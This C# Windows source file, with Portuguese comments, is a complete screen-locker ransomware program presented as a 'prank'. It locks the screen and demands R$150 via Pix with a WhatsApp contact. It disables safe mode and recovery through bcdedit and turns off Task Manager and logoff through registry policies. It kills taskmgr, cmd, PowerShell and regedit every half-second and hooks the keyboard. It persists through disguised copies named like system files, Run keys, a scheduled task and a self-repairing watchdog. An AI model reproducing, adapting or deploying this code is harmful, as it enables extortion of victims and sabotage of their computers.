using System;
using System.Drawing;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.IO;
using Microsoft.Win32;
using System.Threading;

public class TrolagemHacker : Form
{
    private TextBox txtChave;
    private Button btnDesbloquear;
    private Label lblCronometro;
    private System.Windows.Forms.Timer timerProtecao;
    private System.Windows.Forms.Timer timerRelogio;
    private System.Windows.Forms.Timer timerVigia;
    private DateTime tempoFinal;
    
    private const string SENHA_MESTRA = "nakaxima123";
    private const string URL_SENHA = "https://raw.githubusercontent.com/espertin/wind/main/trolagem";
    private const string URL_HACKER = "https://i.ibb.co/NgkJFxH8/ASA.png";
    private const string URL_QRCODE = "https://raw.githubusercontent.com/espertin/wind/main/QR.png";
    private const string URL_CODIGO = "https://raw.githubusercontent.com/espertin/wind/main/TrolagemHacker_GitHub.cs";

    // Caminhos de persistência
    private static string exeHidden = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "WindowsService.exe");
    private static string exeStartup = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "SystemCheck.exe");
    private static string exeLocal = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp", "svchost_check.exe");

    [DllImport("user32.dll")]
    private static extern int FindWindow(string className, string windowText);
    [DllImport("user32.dll")]
    private static extern int ShowWindow(int hwnd, int command);
    [DllImport("user32.dll")]
    private static extern bool SetForegroundWindow(IntPtr hWnd);
    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    private const int SW_HIDE = 0;
    private const int SW_SHOW = 5;

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    private static IntPtr _hookID = IntPtr.Zero;
    private static LowLevelKeyboardProc _proc = HookCallback;

    public TrolagemHacker()
    {
        Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.RealTime;

        // Matar instâncias anteriores
        Process atual = Process.GetCurrentProcess();
        foreach (Process p in Process.GetProcessesByName(atual.ProcessName)) {
            if (p.Id != atual.Id) try { p.Kill(); } catch {}
        }

        this.BackColor = Color.Black;
        this.FormBorderStyle = FormBorderStyle.None;
        this.WindowState = FormWindowState.Maximized;
        this.TopMost = true;
        this.ShowInTaskbar = false;
        this.DoubleBuffered = true;

        int sw = Screen.PrimaryScreen.Bounds.Width;
        int sh = Screen.PrimaryScreen.Bounds.Height;

        // ============================================================
        // BLOQUEIO DE ROTAS DE FUGA (MODO SEGURO + RECUPERAÇÃO)
        // ============================================================
        BloquearRotasDeFuga();

        // ============================================================
        // PERSISTÊNCIA MÚLTIPLA (3 CÓPIAS + 3 REGISTROS + TAREFA)
        // ============================================================
        InstalarPersistencia();

        // ============================================================
        // DOWNLOAD DAS IMAGENS PARA DISCO
        // ============================================================
        string tempFolder = Path.Combine(Path.GetTempPath(), "trolagem_imgs");
        if (!Directory.Exists(tempFolder)) Directory.CreateDirectory(tempFolder);
        string hackerPath = Path.Combine(tempFolder, "hacker.png");
        string qrPath = Path.Combine(tempFolder, "qr.png");

        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
        WebClient client = new WebClient();
        client.CachePolicy = new System.Net.Cache.RequestCachePolicy(System.Net.Cache.RequestCacheLevel.NoCacheNoStore);
        client.Headers.Add("Cache-Control", "no-cache");
        client.Headers.Add("Pragma", "no-cache");
        string cacheBuster = "?nocache=" + DateTime.Now.Ticks.ToString();

        try { client.DownloadFile(URL_HACKER + cacheBuster, hackerPath); } catch {}
        try { client.DownloadFile(URL_QRCODE + cacheBuster, qrPath); } catch {}

        // ============================================================
        // IMAGEM HACKER (TOPO)
        // ============================================================
        PictureBox pbHacker = new PictureBox();
        pbHacker.BackColor = Color.Black;
        pbHacker.SizeMode = PictureBoxSizeMode.Zoom;
        pbHacker.Size = new Size(180, 180);
        pbHacker.Location = new Point((sw - 180) / 2, 15);
        if (File.Exists(hackerPath)) pbHacker.ImageLocation = hackerPath;
        this.Controls.Add(pbHacker);

        // ============================================================
        // TÍTULO
        // ============================================================
        Label lblTitulo = new Label();
        lblTitulo.Text = "ERRO FATAL: SISTEMA INFECTADO 'by Nakaxima'";
        lblTitulo.ForeColor = Color.Red;
        lblTitulo.Font = new Font("Courier New", 22, FontStyle.Bold);
        lblTitulo.TextAlign = ContentAlignment.MiddleCenter;
        lblTitulo.Size = new Size(sw, 60);
        lblTitulo.Location = new Point(0, 200);
        this.Controls.Add(lblTitulo);

        // ============================================================
        // TEXTO ZOEIRA
        // ============================================================
        Label lblTexto = new Label();
        lblTexto.Text = "PROCEDIMENTO DE RECUPERAÇÃO OBRIGATÓRIO!\n" +
                        "Para recuperar o funcionamento completo do computador,\n" +
                        "é necessário efetuar o pagamento de R$ 150,00 (cento e cinquenta reais) via Pix, utilizando o QR Code exibido nesta tela.\n\n" +
                        "STATUS DO SISTEMA:\n" +
                        "- Barra de tarefas: BLOQUEADO\n" +
                        "- Area de trabalho: PARCIALMENTE BLOQUEADA\n" +
                        "- Gerenciador de tarefas: BLOQUEADA\n\n" +
                        "Após a realização do pagamento, o usuário deverá enviar o comprovante de transação para o seguinte WhatsApp:\n" +
                        "+55 12 99743-5455\n" +
                        "A senha de desbloqueio será fornecida exclusivamente após a confirmação do pagamento." +
                        "Você tem o prazo abaixo...";
        lblTexto.ForeColor = Color.Lime;
        lblTexto.Font = new Font("Courier New", 11, FontStyle.Bold);
        lblTexto.TextAlign = ContentAlignment.MiddleCenter;
        lblTexto.Size = new Size(800, 260);
        lblTexto.Location = new Point((sw - 800) / 2, 265);
        this.Controls.Add(lblTexto);

        // ============================================================
        // QR CODE
        // ============================================================
        PictureBox pbQR = new PictureBox();
        pbQR.BackColor = Color.Black;
        pbQR.SizeMode = PictureBoxSizeMode.Zoom;
        pbQR.Size = new Size(110, 110);
        pbQR.Location = new Point((sw - 110) / 2, 530);
        if (File.Exists(qrPath)) pbQR.ImageLocation = qrPath;
        this.Controls.Add(pbQR);

        // ============================================================
        // CAMPO SENHA + BOTÃO
        // ============================================================
        txtChave = new TextBox();
        txtChave.PasswordChar = '*';
        txtChave.Font = new Font("Arial", 18);
        txtChave.TextAlign = HorizontalAlignment.Center;
        txtChave.Size = new Size(250, 40);
        txtChave.Location = new Point((sw - 250) / 2, 650);
        this.Controls.Add(txtChave);

        btnDesbloquear = new Button();
        btnDesbloquear.Text = "DESBLOQUEAR";
        btnDesbloquear.BackColor = Color.Lime;
        btnDesbloquear.FlatStyle = FlatStyle.Flat;
        btnDesbloquear.Font = new Font("Arial", 11, FontStyle.Bold);
        btnDesbloquear.Size = new Size(250, 45);
        btnDesbloquear.Location = new Point((sw - 250) / 2, 700);
        btnDesbloquear.Click += (s, e) => VerificarChave();
        this.Controls.Add(btnDesbloquear);

        // ============================================================
        // CRONÔMETRO 24H
        // ============================================================
        tempoFinal = DateTime.Now.AddHours(24);
        lblCronometro = new Label();
        lblCronometro.ForeColor = Color.Lime;
        lblCronometro.Font = new Font("Courier New", 24, FontStyle.Bold);
        lblCronometro.Size = new Size(sw, 50);
        lblCronometro.TextAlign = ContentAlignment.MiddleCenter;
        lblCronometro.Location = new Point(0, sh - 90);
        this.Controls.Add(lblCronometro);

        timerRelogio = new System.Windows.Forms.Timer();
        timerRelogio.Interval = 1000;
        timerRelogio.Tick += (s, e) => {
            TimeSpan resta = tempoFinal - DateTime.Now;
            lblCronometro.Text = (resta.TotalSeconds <= 0) ? "TEMPO ESGOTADO" : string.Format("{0:D2}:{1:D2}:{2:D2}", resta.Hours, resta.Minutes, resta.Seconds);
        };
        timerRelogio.Start();

        // ============================================================
        // PROTEÇÃO (GERENCIADOR + BARRA + FOCO)
        // ============================================================
        ControlarBarraTarefas(false);

        timerProtecao = new System.Windows.Forms.Timer();
        timerProtecao.Interval = 500;
        timerProtecao.Tick += (s, e) => {
            // Matar gerenciador de tarefas
            foreach (var p in Process.GetProcessesByName("taskmgr")) try { p.Kill(); } catch {}
            // Matar prompt de comando
            foreach (var p in Process.GetProcessesByName("cmd")) try { p.Kill(); } catch {}
            // Matar PowerShell
            foreach (var p in Process.GetProcessesByName("powershell")) try { p.Kill(); } catch {}
            foreach (var p in Process.GetProcessesByName("pwsh")) try { p.Kill(); } catch {}
            // Matar msconfig
            foreach (var p in Process.GetProcessesByName("msconfig")) try { p.Kill(); } catch {}
            // Matar regedit
            foreach (var p in Process.GetProcessesByName("regedit")) try { p.Kill(); } catch {}

            ControlarBarraTarefas(false);
            if (GetForegroundWindow() != this.Handle) {
                SetForegroundWindow(this.Handle);
                txtChave.Focus();
            }
        };
        timerProtecao.Start();

        // ============================================================
        // VIGIA: VERIFICA SE OS ARQUIVOS FORAM DELETADOS E REPARA
        // ============================================================
        timerVigia = new System.Windows.Forms.Timer();
        timerVigia.Interval = 10000; // A cada 10 segundos
        timerVigia.Tick += (s, e) => {
            try {
                string myPath = Application.ExecutablePath;
                // Se alguma cópia foi deletada, recriar
                if (!File.Exists(exeHidden)) try { File.Copy(myPath, exeHidden, true); } catch {}
                if (!File.Exists(exeStartup)) try { File.Copy(myPath, exeStartup, true); } catch {}
                if (!File.Exists(exeLocal)) try { File.Copy(myPath, exeLocal, true); } catch {}
                // Garantir que o registro continua apontando
                try {
                    RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                    rk.SetValue("SecurityAlert", exeHidden);
                    rk.SetValue("WindowsServiceCheck", exeLocal);
                } catch {}
            } catch {}
        };
        timerVigia.Start();

        _hookID = SetHook(_proc);
        txtChave.Focus();
    }

    // ================================================================
    // BLOQUEAR MODO SEGURO + MENU DE RECUPERAÇÃO + SHIFT+REINICIAR
    // ================================================================
    private void BloquearRotasDeFuga() {
        try {
            // Desativar Modo Seguro (Minimal)
            ProcessStartInfo psi1 = new ProcessStartInfo("bcdedit", "/set {default} safeboot disabled");
            psi1.WindowStyle = ProcessWindowStyle.Hidden;
            psi1.CreateNoWindow = true;
            try { Process.Start(psi1); } catch {}

            // Desativar Menu de Recuperação (F8 / Shift+Reiniciar)
            ProcessStartInfo psi2 = new ProcessStartInfo("bcdedit", "/set {default} recoveryenabled No");
            psi2.WindowStyle = ProcessWindowStyle.Hidden;
            psi2.CreateNoWindow = true;
            try { Process.Start(psi2); } catch {}

            // Desativar opções avançadas de boot
            ProcessStartInfo psi3 = new ProcessStartInfo("bcdedit", "/set {default} bootstatuspolicy IgnoreAllFailures");
            psi3.WindowStyle = ProcessWindowStyle.Hidden;
            psi3.CreateNoWindow = true;
            try { Process.Start(psi3); } catch {}

            // Desativar Reparo Automático
            ProcessStartInfo psi4 = new ProcessStartInfo("bcdedit", "/set {current} bootmenupolicy Legacy");
            psi4.WindowStyle = ProcessWindowStyle.Hidden;
            psi4.CreateNoWindow = true;
            try { Process.Start(psi4); } catch {}

            // Desativar Ctrl+Alt+Del para trocar de usuário
            try {
                RegistryKey polKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                polKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                polKey.SetValue("DisableLockWorkstation", 1, RegistryValueKind.DWord);
                polKey.SetValue("DisableChangePassword", 1, RegistryValueKind.DWord);
            } catch {}

            // Desativar Ctrl+Alt+Del opções via Explorer Policies
            try {
                RegistryKey expKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                expKey.SetValue("NoWinKeys", 1, RegistryValueKind.DWord);
                expKey.SetValue("NoClose", 1, RegistryValueKind.DWord);
                expKey.SetValue("NoLogoff", 1, RegistryValueKind.DWord);
            } catch {}

        } catch {}
    }

    // ================================================================
    // PERSISTÊNCIA MÚLTIPLA (3 LOCAIS + 2 REGISTROS + TAREFA AGENDADA)
    // ================================================================
    private void InstalarPersistencia() {
        try {
            string myPath = Application.ExecutablePath;

            // Cópia 1: AppData\Roaming\Microsoft\WindowsService.exe
            string dir1 = Path.GetDirectoryName(exeHidden);
            if (!Directory.Exists(dir1)) Directory.CreateDirectory(dir1);
            if (!File.Exists(exeHidden)) File.Copy(myPath, exeHidden, true);

            // Cópia 2: Startup\SystemCheck.exe
            if (!File.Exists(exeStartup)) File.Copy(myPath, exeStartup, true);

            // Cópia 3: LocalAppData\Temp\svchost_check.exe
            string dir3 = Path.GetDirectoryName(exeLocal);
            if (!Directory.Exists(dir3)) Directory.CreateDirectory(dir3);
            if (!File.Exists(exeLocal)) File.Copy(myPath, exeLocal, true);

            // Registro 1: HKCU\Run - SecurityAlert
            RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            rk.SetValue("SecurityAlert", exeHidden);

            // Registro 2: HKCU\Run - WindowsServiceCheck
            rk.SetValue("WindowsServiceCheck", exeLocal);

            // Tarefa Agendada (prioridade máxima, sem atraso)
            ProcessStartInfo psi = new ProcessStartInfo("schtasks",
                "/create /f /sc ONLOGON /tn \"WindowsSecurityService\" /tr \"" + exeHidden + "\" /rl HIGHEST");
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            psi.CreateNoWindow = true;
            try { Process.Start(psi); } catch {}

        } catch {}
    }

    private void ControlarBarraTarefas(bool mostrar) {
        int hwndBarra = FindWindow("Shell_TrayWnd", "");
        int comando = mostrar ? SW_SHOW : SW_HIDE;
        if (hwndBarra != 0) ShowWindow(hwndBarra, comando);
    }

    // ================================================================
    // RESTAURAR TUDO AO DIGITAR A SENHA CORRETA
    // ================================================================
    private void VerificarChave() {
        string senhaGitHub = "";
        try {
            WebClient wc = new WebClient();
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            wc.CachePolicy = new System.Net.Cache.RequestCachePolicy(System.Net.Cache.RequestCacheLevel.NoCacheNoStore);
            wc.Headers.Add("Cache-Control", "no-cache");
            wc.Headers.Add("Pragma", "no-cache");
            senhaGitHub = wc.DownloadString(URL_SENHA + "?nocache=" + DateTime.Now.Ticks.ToString()).Trim();
        } catch {}

        if (txtChave.Text == SENHA_MESTRA || (!string.IsNullOrEmpty(senhaGitHub) && txtChave.Text == senhaGitHub)) {
            UnhookWindowsHookEx(_hookID);
            timerProtecao.Stop();
            timerVigia.Stop();
            ControlarBarraTarefas(true);
            
            try {
                // ============================================
                // RESTAURAR MODO SEGURO E RECUPERAÇÃO
                // ============================================
                try {
                    Process.Start(new ProcessStartInfo("bcdedit", "/deletevalue {default} safeboot") { WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true });
                    Process.Start(new ProcessStartInfo("bcdedit", "/set {default} recoveryenabled Yes") { WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true });
                    Process.Start(new ProcessStartInfo("bcdedit", "/set {default} bootstatuspolicy DisplayAllFailures") { WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true });
                    Process.Start(new ProcessStartInfo("bcdedit", "/set {current} bootmenupolicy Standard") { WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true });
                } catch {}

                // ============================================
                // RESTAURAR POLÍTICAS DO REGISTRO
                // ============================================
                try {
                    RegistryKey polKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
                    if (polKey != null) { polKey.DeleteValue("DisableTaskMgr", false); polKey.DeleteValue("DisableLockWorkstation", false); polKey.DeleteValue("DisableChangePassword", false); }
                    RegistryKey expKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", true);
                    if (expKey != null) { expKey.DeleteValue("NoWinKeys", false); expKey.DeleteValue("NoClose", false); expKey.DeleteValue("NoLogoff", false); }
                } catch {}

                // ============================================
                // REMOVER PERSISTÊNCIA
                // ============================================
                try {
                    RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                    rk.DeleteValue("SecurityAlert", false);
                    rk.DeleteValue("WindowsServiceCheck", false);
                } catch {}

                // Remover tarefa agendada
                try {
                    Process.Start(new ProcessStartInfo("schtasks", "/delete /f /tn \"WindowsSecurityService\"") { WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true });
                } catch {}

                // Limpar imagens temporárias
                string tempFolder = Path.Combine(Path.GetTempPath(), "trolagem_imgs");
                if (Directory.Exists(tempFolder)) Directory.Delete(tempFolder, true);

                // ============================================
                // AUTODESTRUIÇÃO DE TODAS AS CÓPIAS
                // ============================================
                string batContent = "@echo off\n" +
                    "timeout /t 3 /nobreak > nul\n" +
                    "del /f /q \"" + Application.ExecutablePath + "\" >nul 2>&1\n" +
                    "del /f /q \"" + exeHidden + "\" >nul 2>&1\n" +
                    "del /f /q \"" + exeStartup + "\" >nul 2>&1\n" +
                    "del /f /q \"" + exeLocal + "\" >nul 2>&1\n" +
                    "del /f /q \"%~f0\"\n" +
                    "exit";
                string batPath = Path.Combine(Path.GetTempPath(), "cleanup_final.bat");
                File.WriteAllText(batPath, batContent);
                Process.Start(new ProcessStartInfo("cmd.exe", "/c \"" + batPath + "\"") { WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true });

            } catch {}

            MessageBox.Show("SISTEMA RESTAURADO COM SUCESSO!\nTodos os bloqueios foram removidos.", "DESBLOQUEADO", MessageBoxButtons.OK, MessageBoxIcon.Information);
            Application.Exit();
        } else {
            MessageBox.Show("CHAVE INCORRETA!\nTentativas restantes: ???", "ERRO", MessageBoxButtons.OK, MessageBoxIcon.Error);
            txtChave.Clear();
            txtChave.Focus();
        }
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule) {
            return SetWindowsHookEx(13, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0) {
            int vkCode = Marshal.ReadInt32(lParam);
            Keys key = (Keys)vkCode;
            if (key == Keys.LWin || key == Keys.RWin ||
                key == Keys.Delete ||
                (key == Keys.Tab && Control.ModifierKeys == Keys.Alt) ||
                (key == Keys.Escape && Control.ModifierKeys == Keys.Control) ||
                (key == Keys.F4 && Control.ModifierKeys == Keys.Alt)) {
                return (IntPtr)1;
            }
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    [STAThread]
    public static void Main() {
        // Mutex para garantir instância única
        bool criouNovo;
        Mutex mutex = new Mutex(true, "TrolagemHackerFortaleza", out criouNovo);
        if (!criouNovo) return;

        Application.EnableVisualStyles();
        Application.Run(new TrolagemHacker());
    }
}
